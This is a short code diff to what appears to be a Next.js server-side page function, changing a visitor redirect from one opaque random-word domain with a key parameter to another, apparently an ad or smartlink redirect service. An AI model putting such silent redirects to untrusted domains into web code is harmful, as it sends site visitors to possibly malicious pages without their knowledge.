@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://heartachegrabbedlaunching.com/g7bkdkqpq?key=1dc91aeff4340ebd2e9268002a0998ce`
+					`https://fundsruffianfollows.com/s236wcwxs?key=7d05c4b78b3d33d5a2bc8b8c4c7bfd4b`
 				}`,
 			},
 		};
